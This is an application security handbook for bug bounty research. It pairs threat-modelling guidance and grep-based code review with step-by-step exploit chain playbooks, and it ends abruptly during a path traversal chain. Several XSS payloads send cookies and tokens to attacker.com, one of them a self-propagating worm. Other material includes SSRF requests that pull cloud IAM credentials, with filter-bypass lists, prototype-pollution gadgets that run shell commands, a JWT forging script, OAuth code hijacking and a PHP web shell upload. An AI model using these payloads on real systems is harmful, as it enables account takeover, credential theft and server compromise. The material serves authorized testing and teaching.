This is the \*\*complete, systemized AppSec Engineer's Handbook\*\* — expanded with systems thinking mental models, full exploit chain playbooks, trust boundary analysis, and a rigorous exploitability decision framework. Every section is built from confirmed bug bounty research and real-world attack patterns.



\*\*\*



\# 🧠 The Total Application Security Engineer's Handbook

\### Systems Thinking, Vulnerability Chaining \& Exploitability Verification



\*\*\*



\## 📐 Foundational Mental Model: Think in Systems, Not Symptoms



The single most important shift in elite security research is moving from \*"is this line of code vulnerable?"\* to \*"how do these systems trust each other, and what happens when that trust is abused?"\* \[arxiv](https://arxiv.org/abs/2001.05734)



\### The Four Layers of Systems Thinking in Security



```

┌─────────────────────────────────────────────────────────────────┐

│  LAYER 4: BUSINESS LOGIC LAYER                                  │

│  "What are the rules of the business? Who is allowed to do what │

│   under what conditions? Where do those rules break down?"       │

├─────────────────────────────────────────────────────────────────┤

│  LAYER 3: TRUST BOUNDARY LAYER                                   │

│  "Which components trust each other implicitly? What tokens,     │

│   headers, or network positions grant privilege? Can those be    │

│   spoofed from a lower-trust zone?"                              │

├─────────────────────────────────────────────────────────────────┤

│  LAYER 2: DATA FLOW LAYER                                        │

│  "Where does data enter? How does it move between components?    │

│   What transformations happen to it? Where does it exit/execute?"│

├─────────────────────────────────────────────────────────────────┤

│  LAYER 1: COMPONENT LAYER                                        │

│  "What are the individual pieces: DB, cache, message queue,      │

│   CDN, auth service, cloud metadata? What does each component    │

│   trust by default?"                                             │

└─────────────────────────────────────────────────────────────────┘



The vulnerability lives at a specific layer.

The EXPLOIT CHAIN traverses MULTIPLE layers.

The IMPACT is always at the highest layer reached.

```



\### The Attacker's Fundamental Questions (Ask These First)



Before writing a single grep command, answer these: \[optiv](https://www.optiv.com/insights/discover/blog/application-threat-modeling)



```

1\. WHAT DOES THE SYSTEM PROTECT?

&#x20;  → Credentials? PII? Financial data? Admin access? Source code?

&#x20;  → The answer defines what "Critical" impact means here.



2\. WHO DOES THE SYSTEM TRUST, AND HOW IS THAT TRUST SIGNALED?

&#x20;  → JWT tokens? Session cookies? IP allowlists? Internal network position?

&#x20;  → API keys in headers? OAuth tokens? mTLS certificates?

&#x20;  → Trust signals = attack targets for impersonation/injection.



3\. WHERE ARE THE PRIVILEGE BOUNDARIES?

&#x20;  → Guest → User → Admin → Service Account → Root

&#x20;  → Unauthenticated → Authenticated → Tenant A → Tenant B

&#x20;  → Internet → VPC → Internal API → Database

&#x20;  → Each boundary crossing = a potential privilege escalation.



4\. WHICH COMPONENTS CAN REACH WHICH OTHER COMPONENTS?

&#x20;  → Draw an arrow diagram: App → DB, App → Cache, App → Queue

&#x20;  → App → External API, App → S3, Microservice A → Microservice B

&#x20;  → Any component reachable from user input = SSRF target.

&#x20;  → Any component that executes data from another = injection target.



5\. WHAT HAPPENS WHEN ASSUMPTIONS ARE VIOLATED?

&#x20;  → "We assume the JWT is valid" → What if it's forged?

&#x20;  → "We assume this only runs internally" → What if it's exposed?

&#x20;  → "We assume the filename is safe" → What if it contains ../?

```



\*\*\*



\## 🗺️ Phase 0: System Architecture Mapping (Before Any Code Review)



Build this mental map before touching code. It directs every decision that follows. \[optiv](https://www.optiv.com/insights/discover/blog/application-threat-modeling)



\### Step 0.1 — Draw the Data Flow Diagram (DFD)



```

PROCEDURE: Build a Threat Model DFD in 15 Minutes



1\. IDENTIFY EXTERNAL ENTITIES (untrusted input sources):

&#x20;  - Browser/Mobile App (user)

&#x20;  - Webhooks (third-party callbacks)

&#x20;  - File uploads

&#x20;  - CI/CD pipelines

&#x20;  - External APIs



2\. IDENTIFY PROCESSES (components that transform data):

&#x20;  - Web server / API layer

&#x20;  - Auth service / OAuth provider

&#x20;  - Business logic services

&#x20;  - Background job workers

&#x20;  - Admin panels



3\. IDENTIFY DATA STORES (persistence):

&#x20;  - Primary DB (PostgreSQL, MySQL, MongoDB)

&#x20;  - Cache (Redis, Memcached)

&#x20;  - Object storage (S3)

&#x20;  - Message queues (SQS, Kafka, RabbitMQ)

&#x20;  - Secrets manager (Vault, AWS SSM)



4\. IDENTIFY EXTERNAL SERVICES (implicit trust):

&#x20;  - Cloud metadata API (169.254.169.254)

&#x20;  - Internal microservices

&#x20;  - Email/SMS providers

&#x20;  - Logging/monitoring (Datadog, Splunk)



5\. DRAW TRUST BOUNDARIES (these are your attack targets):

&#x20;  ══════ Internet boundary (untrusted → semi-trusted)

&#x20;  ──────  VPC boundary (semi-trusted → trusted)

&#x20;  ▓▓▓▓▓▓  Auth boundary (unauthenticated → authenticated)

&#x20;  ░░░░░░  Tenant boundary (Tenant A ↔ Tenant B)



EXAMPLE DFD:

\[Browser] ══► \[Load Balancer] ──► \[API Gateway]

&#x20;                                      │

&#x20;                   ┌──────────────────┼──────────────────┐

&#x20;                   ▼                  ▼                   ▼

&#x20;             \[Auth Service]    \[Business Logic]    \[Admin Service]

&#x20;                   │                  │                   │

&#x20;             \[Token Store      \[PostgreSQL DB]      \[Internal Tools]

&#x20;              (Redis)]              │

&#x20;                               \[S3 Object Store]

&#x20;                                    │

&#x20;                           \[AWS Lambda / Workers]

&#x20;                                    │

&#x20;                           \[Cloud Metadata API] ← ← SSRF TARGET

```



\### Step 0.2 — Enumerate Trust Signals



```bash

\# In source code, find ALL trust signals the system uses:



\# 1. JWT / Session Tokens

grep -rn "verify\\|decode\\|Bearer\\|Authorization" --include="\*.js" --include="\*.py" -l



\# 2. IP-based trust (internal network allowlisting)

grep -rn "127\\.0\\.0\\.1\\|localhost\\|internal\\|10\\.\\|192\\.168\\.\\|172\\." --include="\*.js" --include="\*.py"

grep -rn "X-Forwarded-For\\|X-Real-IP\\|X-Client-IP" --include="\*.js"

\# FLAG: Trusting X-Forwarded-For header for IP allowlisting = trivially bypassable



\# 3. Role/Permission checks

grep -rn "isAdmin\\|hasRole\\|can\\(\\|permissions\\.\\|scope\\." --include="\*.js" --include="\*.py"



\# 4. Tenant isolation

grep -rn "tenant\_id\\|org\_id\\|company\_id\\|workspace\_id" --include="\*.js" --include="\*.py"

\# For each DB query, check: is tenant\_id in the WHERE clause?



\# 5. API keys for service-to-service communication

grep -rn "X-API-Key\\|X-Service-Token\\|Internal-Auth\\|service\_key" --include="\*.js"

\# If these are static/hardcoded → service impersonation



\# 6. CORS policy (trust granted to other origins)

grep -rn "Access-Control-Allow-Origin\\|cors(\\|CORS" --include="\*.js" --include="\*.py"

\# FLAG: Access-Control-Allow-Origin: \* with credentials → cross-origin data theft

\# FLAG: Origin reflected back without validation → any domain can read responses

```



\### Step 0.3 — Identify the "Crown Jewels"



```

Rank target assets by impact:



TIER 1 — Full System Compromise:

&#x20; □ RCE on production server

&#x20; □ Admin credential access

&#x20; □ Cloud IAM key with AdministratorAccess

&#x20; □ Database with all user PII + passwords



TIER 2 — Mass Data Breach / Account Takeover:

&#x20; □ Session tokens / JWT signing keys

&#x20; □ Password reset mechanism

&#x20; □ OAuth authorization flow

&#x20; □ User PII database



TIER 3 — Targeted User Compromise:

&#x20; □ Individual account takeover

&#x20; □ IDOR on sensitive user data

&#x20; □ Stored XSS in victim's session



TIER 4 — Integrity / Availability:

&#x20; □ Business logic bypass (free purchases, etc.)

&#x20; □ Data modification

&#x20; □ Service DoS



Your exploit chains should AIM for Tier 1 or 2.

Individual bugs below High rarely hit these alone.

```



\*\*\*



\## ⛓️ The Exploit Chain Framework



Vulnerability chaining is the #1 skill that separates researchers earning $500 per report from those earning $5,000–$50,000.  A single Medium bug becomes Critical when it unlocks the next step. \[intigriti](https://www.intigriti.com/blog/business-insights/chaining-in-action-techniques-terminology-and-real-world-impact-on-business)



\### The Chain Construction Mental Model



```

CHAIN CONSTRUCTION RULES:



Rule 1 — PRIMITIVES TO IMPACT

Every chain has building blocks ("primitives") that transform into impact:

&#x20; READ primitive:   Read arbitrary files / memory / other users' data

&#x20; WRITE primitive:  Write files, modify DB records, inject content

&#x20; EXECUTE primitive: Execute code, OS commands, SQL queries

&#x20; TRUST primitive:  Impersonate user, bypass auth, escalate privilege

&#x20; REACH primitive:  Access internal network, other tenants, cloud services



The chain's job is to COMBINE primitives to reach Tier 1/2 impact.



Rule 2 — ALWAYS ASK "WHAT DOES THIS UNLOCK?"

When you find ANY bug, don't file it immediately. Ask:

&#x20; "If I can \[read file X], what files would give me more access?"

&#x20; "If I can \[make server-side requests], what internal services exist?"

&#x20; "If I can \[inject HTML], is this a shared admin panel?"

&#x20; "If I can \[pollute prototype], are there dangerous gadgets in this framework?"



Rule 3 — FOLLOW THE TRUST

After each step, ask: "What does the next component TRUST that I now control?"

&#x20; Compromised user session → trusted by the application as that user

&#x20; SSRF to metadata API → cloud credentials trusted by all AWS services

&#x20; Prototype pollution → trusted by template engine to render arbitrary code

&#x20; XSS in admin panel → trusted by admin's browser with admin session



Rule 4 — LOW + LOW = CRITICAL

Combinations that frequently elevate severity:

&#x20; IDOR (read) + Stored XSS (write) = Account Takeover at scale

&#x20; Open Redirect + OAuth = Token Hijacking

&#x20; Reflected XSS + CSRF bypass = Admin Action as Victim

&#x20; Path Traversal + File Write = RCE

&#x20; SSRF + Cloud Metadata = Credential Exfil → Full AWS Compromise

&#x20; Info Disclosure + Weak Auth = Authentication Bypass

&#x20; Race Condition + IDOR = Privilege Escalation

```



\*\*\*



\## 📋 Exploit Chain Playbooks



\### Chain #1: XSS → Account Takeover (ATO) at Scale



\*\*Severity Elevation:\*\* Medium XSS + Medium IDOR → Critical (Mass ATO)



\*\*Systems Logic:\*\*

```

\[Stored XSS in profile field] → \[Rendered in Admin Dashboard]

&#x20;        → \[Admin's session cookie stolen]

&#x20;        → \[Admin credentials = full application access]



OR:



\[Stored XSS in user-controlled field] → \[Rendered in victim's browser]

&#x20;        → \[Victim's session token exfiltrated]

&#x20;        → \[Session replayed by attacker] → \[Victim account taken over]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Find the XSS injection point

&#x20; grep -rn "dangerouslySetInnerHTML\\|innerHTML\\|v-html\\|\\{\\{.\*\\|safe\\}\\}" 

&#x20; Target: profile bio, display name, address fields — anything that

&#x20;         renders in OTHER users' contexts (admin panels, shared views)



STEP 2: Determine the rendering context

&#x20; Question: WHERE does this field render?

&#x20; → If it renders ONLY for the user themselves → Low (Self-XSS, usually OOS)

&#x20; → If it renders in ADMIN PANEL → High/Critical (admin ATO)

&#x20; → If it renders for OTHER USERS → High (mass ATO)

&#x20; → If it renders in EMAIL → Medium (limited impact)

&#x20; 

&#x20; How to check: grep for where the field is output in templates/components

&#x20; grep -rn "user\\.bio\\|profile\\.name\\|account\\.description" --include="\*.jsx" --include="\*.html"



STEP 3: Confirm HttpOnly cookie status

&#x20; → Check Set-Cookie header: HttpOnly; Secure

&#x20; → If HttpOnly NOT set → steal cookie directly

&#x20; → If HttpOnly IS set → pivot to:

&#x20;     a) XHR-based CSRF to perform actions AS the user

&#x20;     b) Extract CSRF tokens then make state-changing requests

&#x20;     c) Steal localStorage tokens (JWT often stored there)

&#x20; 

&#x20; // XSS payload for JWT in localStorage:

&#x20; fetch('https://\[your-server]/?t='+localStorage.getItem('authToken'))

&#x20; 

&#x20; // XSS payload for CSRF token exfil + action:

&#x20; fetch('/api/change-email',{method:'POST',

&#x20;   headers:{'Content-Type':'application/json',

&#x20;            'X-CSRF-Token': document.querySelector('\[name=csrf]').value},

&#x20;   body: JSON.stringify({email:'attacker@evil.com'}),

&#x20;   credentials:'include'})



STEP 4: Escalate if admin panel renders it

&#x20; → Navigate to admin panel URL (found in phase 1 recon)

&#x20; → Confirm the XSS renders there

&#x20; → Payload: steal admin session → replay to take over admin account

&#x20; → Impact: Full application compromise (Critical)



STEP 5: Construct the PoC request chain

&#x20; Request 1: POST /api/profile {"bio": "<script>fetch(...)...</script>"}

&#x20; Request 2: \[Victim/Admin visits page that renders bio]

&#x20; Request 3: \[Attacker's server receives token]

&#x20; Request 4: GET /api/admin with stolen Authorization header

&#x20; → Document all 4 requests in report

```



\*\*Payload Templates:\*\*



```javascript

// Payload 1: Basic cookie theft (no HttpOnly)

<script>document.location='https://attacker.com/?c='+document.cookie</script>



// Payload 2: JWT from localStorage (bypasses HttpOnly)

<script>fetch('https://attacker.com/?j='+btoa(JSON.stringify(localStorage)))</script>



// Payload 3: CSRF action via XSS (works even WITH HttpOnly)

<script>

fetch('/api/users/me/email',{

&#x20; method:'PUT',

&#x20; headers:{'Content-Type':'application/json'},

&#x20; body:'{"email":"attacker@evil.com"}',

&#x20; credentials:'include'

}).then(r=>fetch('https://attacker.com/log?s='+r.status))

</script>



// Payload 4: Worm payload (self-propagating stored XSS)

<script>

// Steal token AND re-inject into another user's profile

const t = localStorage.getItem('token');

fetch('/api/profile',{method:'PUT',

&#x20; headers:{'Authorization':'Bearer '+t,'Content-Type':'application/json'},

&#x20; body: JSON.stringify({bio: document.currentScript.outerHTML}),

&#x20; credentials:'include'});

fetch('https://attacker.com/?t='+t);

</script>

```



\*\*\*



\### Chain #2: SSRF → Cloud Credential Exfil → Full AWS Compromise



\*\*Severity Elevation:\*\* Medium SSRF → Critical (Complete Cloud Infrastructure Compromise) \[nahamsec](https://www.nahamsec.com/posts/high-value-web-security-vulnerabilities-to-learn-in-2025)



\*\*Systems Logic:\*\*

```

\[User-controlled URL parameter]

&#x20;   → \[Application makes server-side HTTP request]

&#x20;   → \[Request reaches AWS Instance Metadata Service (IMDS)]

&#x20;   → \[IMDS returns IAM role credentials]

&#x20;   → \[Credentials used to call AWS APIs]

&#x20;   → \[Scope depends on attached IAM role → potentially AdministratorAccess]

&#x20;   → \[Exfil all S3 data, spin up crypto miners, delete resources]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Find SSRF entry points (beyond the obvious)

&#x20; OBVIOUS (check these first):

&#x20;   - /api/fetch?url=

&#x20;   - /api/preview?link=

&#x20;   - /webhook/test?endpoint=

&#x20;   

&#x20; NON-OBVIOUS (grep for these):

&#x20;   grep -rn "url\\s\*=\\s\*req\\.\\|link\\s\*=\\s\*req\\.\\|endpoint\\s\*=\\s\*req\\." --include="\*.js"

&#x20;   # Also check:

&#x20;   - PDF generation (wkhtmltopdf, puppeteer) with user-controlled HTML

&#x20;   - Image import from URL (avatar upload by URL)

&#x20;   - XML/SVG file parsing with external entity (XXE)

&#x20;   - Redirect chains: open redirect → SSRF via redirect follow

&#x20;   - Social media link preview generation

&#x20;   - "Import from URL" features

&#x20;   - Payment webhooks with user-configurable callback URLs



STEP 2: Fingerprint the cloud environment

&#x20; # Which cloud? Check response headers, error messages, job listings

&#x20; # Or blind probe:

&#x20; 

&#x20; curl "https://target.com/api/fetch?url=http://169.254.169.254/"  # AWS / GCP

&#x20; curl "https://target.com/api/fetch?url=http://metadata.google.internal/"  # GCP only

&#x20; curl "https://target.com/api/fetch?url=http://169.254.169.254/metadata/instance"  # Azure



STEP 3: Extract IAM credentials (AWS)

&#x20; # If direct access works:

&#x20; STEP\_A = GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

&#x20; # Response: RoleName (e.g., "ec2-production-role")

&#x20; 

&#x20; STEP\_B = GET http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName

&#x20; # Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

&#x20; 

&#x20; # IMDSv2 bypass (if v1 blocked):

&#x20; # Step 1: PUT to get token

&#x20; curl -X PUT "http://169.254.169.254/latest/api/token" \\

&#x20;   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

&#x20; # Step 2: Use token

&#x20; curl -H "X-aws-ec2-metadata-token: TOKEN" \\

&#x20;   "http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"



STEP 4: Verify scope of extracted credentials

&#x20; export AWS\_ACCESS\_KEY\_ID=ASIA...

&#x20; export AWS\_SECRET\_ACCESS\_KEY=...

&#x20; export AWS\_SESSION\_TOKEN=...

&#x20; 

&#x20; aws sts get-caller-identity          # Who am I?

&#x20; aws iam list-attached-role-policies --role-name <role>  # What can I do?

&#x20; aws iam simulate-principal-policy \\

&#x20;   --policy-source-arn <role-arn> \\

&#x20;   --action-names "s3:\*" "ec2:\*" "iam:\*"  # Can I do admin actions?



STEP 5: Demonstrate blast radius (for report — don't actually exfil)

&#x20; # Show what WOULD be possible, not execute it

&#x20; aws s3 ls   # List all buckets

&#x20; aws ec2 describe-instances --region us-east-1  # List all EC2

&#x20; aws secretsmanager list-secrets  # List all secrets

&#x20; # Screenshot the list only — don't download data

&#x20; # This proves Critical impact without causing actual harm



STEP 6: SSRF Bypass Techniques (if direct access blocked)

&#x20; # If URL validation exists, try:

&#x20; BYPASSES = \[

&#x20;   "http://169.254.169.254",          # Direct

&#x20;   "http://169.254.169.254.nip.io",   # DNS-based bypass

&#x20;   "http://\[::ffff:169.254.169.254]", # IPv6 mapped

&#x20;   "http://0251.0376.0251.0376",      # Octal

&#x20;   "http://0xa9fea9fe",               # Hex

&#x20;   "http://2852039166",               # Decimal integer

&#x20;   "http://attacker.com → 302 → http://169.254.169.254",  # Open redirect chain

&#x20;   "http://169.254.169.254%0a@evil.com",  # Newline injection

&#x20;   "http://evil.com#@169.254.169.254",    # Fragment bypass

&#x20; ]

```



\*\*\*



\### Chain #3: Prototype Pollution → RCE via Template Engine Gadget



\*\*Severity Elevation:\*\* Medium Prototype Pollution → Critical RCE \[youtube](https://www.youtube.com/watch?v=KVDOIFeRaPQ)



\*\*Systems Logic:\*\*

```

\[User-controlled JSON body with \_\_proto\_\_ key]

&#x20;   → \[Unsafe merge function applies properties to Object.prototype]

&#x20;   → \[ALL objects in the process now inherit the polluted property]

&#x20;   → \[Template engine (Pug/Handlebars/Nunjucks) reads render options from object]

&#x20;   → \[Polluted option "outputFunctionName" or "escapeFunction" contains OS command]

&#x20;   → \[Template render executes the command]

&#x20;   → \[RCE achieved]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Find the pollution sink

&#x20; grep -rn "merge\\|extend\\|assign\\|clone" --include="\*.js" -l

&#x20; # Open each file and check if user input (req.body) flows in

&#x20; # Look for: \_.merge(target, req.body) or merge(config, userSettings)



STEP 2: Confirm pollution is achievable

&#x20; # Send test payload:

&#x20; POST /api/settings HTTP/1.1

&#x20; {"\_\_proto\_\_": {"polluted": "POLLUTION\_TEST\_12345"}}

&#x20; 

&#x20; # Then check:

&#x20; GET /api/debug-info   (or any endpoint that returns object properties)

&#x20; # OR: look for any endpoint that reflects object properties back

&#x20; # If "POLLUTION\_TEST\_12345" appears anywhere → CONFIRMED



STEP 3: Identify the template engine in use

&#x20; cat package.json | grep -E "pug|handlebars|nunjucks|ejs|jade|hbs|dust"

&#x20; # The gadget depends on which engine is present



STEP 4: Apply the engine-specific RCE gadget

&#x20; # PUG (most common Node.js gadget):

&#x20; {

&#x20;   "\_\_proto\_\_": {

&#x20;     "outputFunctionName": "x;process.mainModule.require('child\_process').execSync('id > /tmp/pwned');x"

&#x20;   }

&#x20; }

&#x20; 

&#x20; # HANDLEBARS gadget:

&#x20; {

&#x20;   "\_\_proto\_\_": {

&#x20;     "type": "Program",

&#x20;     "body": \[{"type": "MustacheStatement","path": {"type": "PathExpression",

&#x20;       "original": "constructor","parts": \["constructor"]},

&#x20;       "params": \[{"type": "StringLiteral","value": "process.mainModule.require('child\_process').execSync('id>/tmp/p')"}],

&#x20;       "hash": {"type": "Hash","pairs": \[]}}]

&#x20;   }

&#x20; }

&#x20; 

&#x20; # LODASH template gadget:

&#x20; {

&#x20;   "\_\_proto\_\_": {

&#x20;     "sourceURL": "\\u000areturn e => {const {exec} = require('child\_process'); exec('id>/tmp/p')}"

&#x20;   }

&#x20; }



STEP 5: Confirm RCE

&#x20; # After sending payload, trigger a template render

&#x20; # Check /tmp/pwned exists, or use DNS callback:

&#x20; "execSync('curl http://\[collaborator].interact.sh/rce')"

&#x20; # Observe DNS/HTTP hit on your interaction server → RCE confirmed



STEP 6: Escalate the impact narrative

&#x20; RCE on the application server means:

&#x20;   → Read /etc/passwd, /proc/environ (environment variables = secrets)

&#x20;   → Read AWS credentials at /home/app/.aws/credentials or env vars

&#x20;   → Network scan the internal VPC (curl http://10.x.x.x)

&#x20;   → Pivot to internal databases (mysql -h internal-db.vpc ...)

&#x20;   → Install a reverse shell for persistence

&#x20; → Impact: Full server compromise → potentially full cloud compromise

```



\*\*\*



\### Chain #4: IDOR + Stored XSS → Mass Account Takeover



\*\*Severity Elevation:\*\* Low IDOR + Medium XSS → Critical (Mass ATO) \[infosecwriteups](https://infosecwriteups.com/from-500-to-5-000-how-chaining-idor-and-xss-led-to-mass-account-takeovers-ethical-hacking-a55de6e59a71)



\*\*Systems Logic:\*\*

```

\[IDOR: Can read/modify other users' profile data by incrementing ID]

&#x20;   → \[User profile has stored XSS in name/bio field]

&#x20;   → \[Attacker writes XSS payload into victim's profile via IDOR]

&#x20;   → \[When admin reviews flagged content, XSS executes in admin session]

&#x20;   → \[Admin session stolen → full platform access]



OR:

\[IDOR: Can enumerate user IDs and emails]

&#x20;   → \[XSS in password reset parameter]

&#x20;   → \[Send forged reset links that steal reset tokens]

&#x20;   → \[Mass reset of all accounts → full ATO]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Find IDOR primitive

&#x20; # Look for numeric/sequential resource IDs in API calls

&#x20; GET /api/users/1337/profile          → try /api/users/1338/profile

&#x20; GET /api/documents/uuid-here         → IDOR on GUIDs (harder, need to leak IDs first)

&#x20; PUT /api/users/1337/bio {"bio": "x"} → write IDOR (more severe than read)

&#x20; 

&#x20; # In source code:

&#x20; grep -rn "params\\.id\\|req\\.params\\.userId\\|query\\.user\_id" --include="\*.js"

&#x20; # For each: check if req.user.id is compared to params.id



STEP 2: Determine what you can write via IDOR

&#x20; # Can you WRITE to another user's profile?

&#x20; PUT /api/users/VICTIM\_ID {"bio": "test"} → 200 OK = write IDOR confirmed

&#x20; 

&#x20; # If yes: identify XSS-injectable fields

&#x20; # Try HTML injection first (safer for PoC):

&#x20; PUT /api/users/VICTIM\_ID {"bio": "<b>IDOR\_WRITE\_TEST</b>"}

&#x20; # If bold text renders in victim's profile → HTML injection → test XSS



STEP 3: Find where the victim's data renders in privileged contexts

&#x20; grep -rn "user\\.bio\\|profile\\.description\\|account\\.displayName" \\

&#x20;   --include="\*.jsx" --include="\*.html" --include="\*.ejs"

&#x20; # Find: admin dashboard, support portal, moderation queue

&#x20; # These are high-value rendering contexts for stored XSS



STEP 4: Construct the full chain payload

&#x20; Request 1: Authenticate as attacker

&#x20; POST /api/auth/login {"user":"attacker","pass":"..."}

&#x20; 

&#x20; Request 2: Write XSS payload into victim's profile via IDOR

&#x20; PUT /api/users/VICTIM\_ID/profile

&#x20; {"bio": "<img src=x onerror=fetch('https://attacker.com/?s='+document.cookie)>"}

&#x20; 

&#x20; Request 3: Trigger the XSS (admin reviews flagged content)

&#x20; POST /api/content/flag {"userId": VICTIM\_ID, "reason": "inappropriate"}

&#x20; → Admin opens moderation queue → XSS executes in admin context

&#x20; 

&#x20; Request 4: Use stolen admin session

&#x20; GET /api/admin/users  -H "Cookie: session=STOLEN\_VALUE"



STEP 5: Demonstrate scale (for severity justification)

&#x20; # Show that IDOR allows targeting ANY user ID

&#x20; # Show that ALL users' profiles render in admin dashboard

&#x20; # Impact: Single attacker could compromise ALL user accounts + admin

&#x20; # This elevates two Medium bugs to Critical

```



\*\*\*



\### Chain #5: Open Redirect → OAuth Token Hijacking → ATO



\*\*Severity Elevation:\*\* Low Open Redirect + Medium OAuth Misconfiguration → Critical ATO



\*\*Systems Logic:\*\*

```

\[OAuth flow sends code/token to redirect\_uri]

&#x20;   → \[App has open redirect vulnerability]

&#x20;   → \[Attacker registers redirect\_uri = app-domain/redirect?next=evil.com]

&#x20;   → \[OAuth provider trusts app domain → allows redirect]

&#x20;   → \[Authorization code sent to app → app redirects to evil.com with code]

&#x20;   → \[Attacker exchanges code for access token]

&#x20;   → \[Full account takeover without user password]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Map the OAuth flow

&#x20; # Find OAuth redirect handling

&#x20; grep -rn "redirect\_uri\\|callback\\|oauth\\|authorization\_code" --include="\*.js" --include="\*.py"

&#x20; grep -rn "?code=\\|\&state=" --include="\*.js"

&#x20; 

&#x20; # Identify the redirect\_uri the app uses:

&#x20; # Look in: /api/auth/google, /oauth/callback, /auth/github/callback



STEP 2: Find open redirect in the application

&#x20; grep -rn "res\\.redirect\\|location\\.href\\s\*=\\|window\\.location\\s\*=" --include="\*.js"

&#x20; grep -rn "next=\\|return\_to=\\|redirect=\\|goto=" --include="\*.js" --include="\*.html"

&#x20; 

&#x20; # Test the open redirect:

&#x20; GET /auth/complete?next=https://evil.com

&#x20; # If redirects to evil.com → confirmed open redirect



STEP 3: Craft the exploit URL

&#x20; # Attacker's crafted OAuth initiation URL:

&#x20; https://accounts.google.com/oauth/authorize

&#x20;   ?client\_id=TARGET\_CLIENT\_ID

&#x20;   \&redirect\_uri=https://target.com/auth/complete?next=https://attacker.com/steal

&#x20;   \&response\_type=code

&#x20;   \&scope=openid email profile

&#x20;   \&state=CSRF\_BYPASS\_IF\_STATE\_PREDICTABLE

&#x20; 

&#x20; # Flow:

&#x20; 1. Victim clicks attacker's link

&#x20; 2. Google redirects to: https://target.com/auth/complete?code=AUTH\_CODE\&next=https://attacker.com/steal

&#x20; 3. Target app processes code (logs in victim) then follows next= redirect

&#x20; 4. OR: Target app redirects BEFORE processing code

&#x20;    → attacker.com receives: ?code=AUTH\_CODE

&#x20; 5. Attacker exchanges code: POST /oauth/token {code: AUTH\_CODE, ...}

&#x20; 6. Receives access\_token → account takeover



STEP 4: Check for state parameter bypass

&#x20; # If state parameter is missing or predictable:

&#x20; grep -rn "state\\s\*=\\|csrf\_token\\|nonce" --include="\*.js" | grep "oauth\\|auth"

&#x20; # If state is not validated → CSRF on OAuth flow → force login as victim



STEP 5: Verify exploitability conditions

&#x20; □ Does the OAuth provider allow redirect\_uri with query parameters?

&#x20; □ Does the app redirect BEFORE or AFTER exchanging the code?

&#x20; □ If after exchange: does redirect happen with the token in the URL fragment?

&#x20; □ Is the state parameter validated? (if not → CSRF amplifies this)

&#x20; □ Is the authorization code single-use? (if not → replay attack possible)

```



\*\*\*



\### Chain #6: JWT Algorithm Confusion → Horizontal Privilege Escalation → Admin Takeover



\*\*Severity Elevation:\*\* Critical standalone, but chain makes it worse



\*\*Systems Logic:\*\*

```

\[JWT with RS256 algorithm, public key exposed in /jwks.json]

&#x20;   → \[Server accepts HS256 tokens signed with the PUBLIC key as HMAC secret]

&#x20;   → \[Attacker forges token with "role":"admin" or any userId]

&#x20;   → \[Admin panel accessible → full application takeover]

```



\*\*Step-by-Step Execution:\*\*



```

STEP 1: Collect the public key

&#x20; # Method A: JWKS endpoint

&#x20; curl https://target.com/.well-known/jwks.json

&#x20; curl https://target.com/auth/jwks

&#x20; curl https://target.com/api/public-key

&#x20; 

&#x20; # Method B: Extract from JWT header (some apps embed it)

&#x20; # Decode JWT header: base64 -d <<< "header\_part"

&#x20; 

&#x20; # Method C: Brute-force key from two valid JWTs

&#x20; # Tool: https://github.com/silentsignal/rsa\_sign2n



STEP 2: Check if server is vulnerable to algorithm confusion

&#x20; # Source code check:

&#x20; grep -rn "jwt\\.verify\\|jwt\\.decode" --include="\*.js"

&#x20; # VULNERABLE: jwt.verify(token, publicKey)  ← no algorithm restriction

&#x20; # SAFE:       jwt.verify(token, publicKey, { algorithms: \['RS256'] })

&#x20; 

&#x20; # Python:

&#x20; # VULNERABLE: jwt.decode(token, public\_key)

&#x20; # SAFE:       jwt.decode(token, public\_key, algorithms=\['RS256'])



STEP 3: Forge the token

&#x20; # Use the tool: jwt\_tool or manual:

&#x20; python3 -c "

&#x20; import jwt, base64

&#x20; 

&#x20; # Load the public key

&#x20; pub\_key = open('public\_key.pem').read()

&#x20; 

&#x20; # Forge payload with elevated privileges

&#x20; forged\_payload = {

&#x20;     'sub': '1',           # Become user ID 1 (often admin)

&#x20;     'role': 'admin',

&#x20;     'iat': 1700000000,

&#x20;     'exp': 9999999999     # Far future expiry

&#x20; }

&#x20; 

&#x20; # Sign with HS256 using public key as the 'secret'

&#x20; forged\_token = jwt.encode(forged\_payload, pub\_key, algorithm='HS256')

&#x20; print(forged\_token)

&#x20; "



STEP 4: Test the forged token

&#x20; curl -H "Authorization: Bearer FORGED\_TOKEN" https://target.com/api/admin/users

&#x20; # 200 = CONFIRMED algorithm confusion vulnerability

&#x20; # 401 = Server correctly rejects HS256



STEP 5: Escalate to demonstrate full impact

&#x20; # With admin token:

&#x20; GET /api/admin/users           → Dump all users

&#x20; POST /api/admin/users/1/reset  → Reset any password

&#x20; GET /api/admin/config          → Read system configuration secrets

&#x20; # Impact: Complete application compromise

```



\*\*\*



\### Chain #7: Path Traversal + File Write → RCE (Web Shell Upload)



\*\*Severity Elevation:\*\* Medium Path Traversal + Medium File Write → Critical RCE



```

STEP 1: Find path traversal in file read

&#x20; # Test: GET /api/files/download?path=../../etc/passwd

&#x20; # Confirm: response contains root:x:0:0:root:/root:/bin/bash



STEP 2: Map the webroot

&#x20; # Read application config files to find webroot:

&#x20; path=../../var/www/html/index.php    (PHP)

&#x20; path=../../app/app.js                (Node.js — confirms path)

&#x20; path=../../proc/self/environ         (Leaks env variables including secrets)

&#x20; path=../../proc/self/cmdline         (Shows how app is launched)



STEP 3: Find file write primitive

&#x20; # Separate from the read: look for file upload, config save, export features

&#x20; grep -rn "fs\\.writeFile\\|writeFileSync\\|fwrite\\|file\_put\_contents" --include="\*.js" --include="\*.php"

&#x20; # Does any write function use user-controlled filename?

&#x20; 

&#x20; # Example: POST /api/export {"filename": "report.pdf", "data": "..."}

&#x20; # Test: {"filename": "../../var/www/html/shell.php", "data": "<?php system($\_GET\['cmd']); ?>"}



STEP 4: Combine traversal + write

